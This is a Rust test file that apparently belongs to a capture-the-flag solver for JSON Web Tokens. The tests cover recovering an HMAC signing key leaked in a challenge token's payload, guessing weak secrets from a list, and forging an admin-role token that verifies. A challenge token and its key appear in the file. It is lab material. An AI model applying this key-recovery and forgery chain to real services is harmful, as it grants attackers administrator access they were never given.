use super::*;

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

#[test]
fn sha256_matches_known_vectors() {
    assert_eq!(
        hex(&sha256(b"abc")),
        "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
    );
    assert_eq!(
        hex(&sha256(b"")),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
    // A message longer than one block, to exercise the schedule across blocks.
    assert_eq!(
        hex(&sha256(
            b"abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq"
        )),
        "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1"
    );
}

#[test]
fn hmac_sha256_matches_rfc_4231() {
    // Test case 2 from RFC 4231.
    let mac = hmac_sha256(b"Jefe", b"what do ya want for nothing?");
    assert_eq!(
        hex(&mac),
        "5bdcc146bf60754e6a042426089575c75a003f089d2739839dec58b964ec3843"
    );
}

/// The real observer token from the challenge: its key is base64 in its own
/// payload, and the key reproduces its own signature.
const OBSERVER: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoib2JzZXJ2ZXIiLCJzdWIiOiJ0ZWxlbWV0cnktY2xpZW50Iiwic2lnbmluZ19rZXlfYjY0IjoiYm1GMWRHbGpiM0p3TFdGMGJHRnpMV3AzZEMxclpYa3RNakF5TmlFaElTRT0ifQ.wQJlo4MKl50KYuPTQKjcfFR3MTx4Ay6WuIkW3u9XCvg";

#[test]
fn parses_only_hs256_tokens() {
    assert!(parse(OBSERVER).is_some());
    assert!(parse("not.a.jwt").is_none());
    assert!(parse("two.parts").is_none());
    // An RS256 header must be refused: its signature is not an HMAC.
    let rs = "eyJhbGciOiJSUzI1NiJ9.eyJhIjoxfQ.c2ln";
    assert!(parse(rs).is_none());
}

#[test]
fn finds_a_token_inside_a_response_body() {
    let body = br#"{"admin_jwt": ""#;
    let mut haystack = body.to_vec();
    haystack.extend_from_slice(OBSERVER.as_bytes());
    haystack.extend_from_slice(br#"", "note": "x"}"#);
    let found = find_tokens(&haystack);
    assert_eq!(found, vec![OBSERVER.to_string()]);
}

#[test]
fn recovers_the_leaked_key_by_signature_match() {
    let token = parse(OBSERVER).unwrap();
    let keys = candidate_keys(&token, b"");
    let key = recover_key(&token, &keys).expect("key not recovered");
    assert_eq!(key, b"nauticorp-atlas-jwt-key-2026!!!!");
}

#[test]
fn recovers_a_weak_secret_from_the_list() {
    // A token nobody leaked the key for, signed with a secret on the weak list.
    let key = b"secret";
    let signing_input = "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9";
    let sig = hmac_sha256(key, signing_input.as_bytes());
    let token_str = format!("{signing_input}.{}", b64url_encode(&sig));
    let token = parse(&token_str).unwrap();
    assert_eq!(
        recover_key(&token, &candidate_keys(&token, b"")).as_deref(),
        Some(&b"secret"[..])
    );
}

#[test]
fn forges_an_admin_token_that_verifies_with_the_key() {
    let token = parse(OBSERVER).unwrap();
    let key = recover_key(&token, &candidate_keys(&token, b"")).unwrap();

    let forged_str = forge_admin(&token, &key);
    let forged = parse(&forged_str).expect("forged token does not parse");

    // The forged signature checks out under the same key.
    assert_eq!(
        hmac_sha256(&key, forged.signing_input.as_bytes()).as_slice(),
        forged.signature.as_slice()
    );
    // And the claims now name an administrator.
    assert!(String::from_utf8_lossy(&forged.payload).contains("\"role\":\"admin\""));
}

#[test]
fn a_wrong_key_is_never_accepted() {
    let token = parse(OBSERVER).unwrap();
    let wrong = vec![b"the-wrong-key".to_vec(), b"admin".to_vec(), b"secret".to_vec()];
    assert!(recover_key(&token, &wrong).is_none());
}
